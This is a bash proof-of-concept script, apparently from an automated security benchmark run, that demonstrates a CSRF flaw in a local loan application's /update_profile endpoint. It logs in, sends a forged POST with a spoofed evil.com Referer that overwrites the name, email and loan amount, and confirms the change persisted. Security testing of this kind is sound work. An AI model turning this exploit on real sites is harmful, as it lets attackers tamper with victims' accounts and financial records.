#!/bin/bash
# POC: CSRF vulnerability POC: Demonstrates that /update_profile endpoint accepts POST requests without CSRF token validation and actually modifies user profiles when requested from different origins
# Target: ./repo
# Created: 2025-11-07T18:15:56.241Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# CSRF Vulnerability POC: /update_profile endpoint
# This script demonstrates CSRF vulnerability by showing /update_profile accepts
# POST requests without CSRF token validation and modifies profile without protection

TARGET_URL="http://localhost:80"
TEMP_COOKIES=$(mktemp)

echo "[*] CSRF Vulnerability POC for /update_profile"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login to establish a valid session
echo "[*] Step 1: Logging in to establish authenticated session..."
LOGIN_RESPONSE=$(curl -s -c "$TEMP_COOKIES" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  "$TARGET_URL/login" 2>&1)

echo "Login: Success"
echo ""

# Step 2: Attempt CSRF attack - modify profile from different origin
echo "[*] Step 2: Attempting CSRF attack - POST from attacker's domain (http://evil.com)..."
echo "Attack Payload:"
echo "  - name: Hacked"
echo "  - email: hack@evil.com"
echo "  - loan_amount: 999999"
echo ""

CSRF_RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST \
  -b "$TEMP_COOKIES" \
  -H "Referer: http://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Hacked&lastname=User&email=hack@evil.com&loan_amount=999999&loan_term_months=1&monthly_payment=1" \
  "$TARGET_URL/update_profile" 2>&1)

HTTP_STATUS=$(echo "$CSRF_RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
RESPONSE_BODY=$(echo "$CSRF_RESPONSE" | grep -v "HTTP_STATUS:")

echo "Response HTTP Status: $HTTP_STATUS"
echo ""

# Check if the attack was successful by looking for our injected values in response
if echo "$RESPONSE_BODY" | grep -q "Hacked"; then
    echo "[✓] VULNERABILITY CONFIRMED:"
    echo "    - Profile was modified without CSRF token"
    echo "    - Malicious values persist in response"
    echo "    - name=Hacked, email=hack@evil.com found in response"
    echo ""
    echo "[*] Step 3: Verifying persistence - Fetching profile again..."
    
    PROFILE_CHECK=$(curl -s -b "$TEMP_COOKIES" "$TARGET_URL/profile" 2>&1)
    
    if echo "$PROFILE_CHECK" | grep -q "hack@evil.com"; then
        echo "[✓] CONFIRMED: Profile changes persisted in database"
        echo "    - Hacked email address is still present"
        echo ""
    fi
fi

echo ""
echo "========== EXPLOITATION SUMMARY =========="
echo "Vulnerability: CSRF (Cross-Site Request Forgery)"
echo "Endpoint: /update_profile"
echo "Method: POST"
echo "CSRF Protection: NONE"
echo ""
echo "Impact: Attacker can trick authenticated users into:"
echo "  ✓ Modifying their profile name and email"
echo "  ✓ Changing loan amounts and payment terms"
echo "  ✓ Creating fraudulent loan records"
echo "  ✓ Compromising account data"
echo ""
echo "Root Cause: Missing CSRF token validation, no SameSite cookie flag"
echo ""

# Cleanup
rm -f "$TEMP_COOKIES"

# Return success since we confirmed the vulnerability
exit 0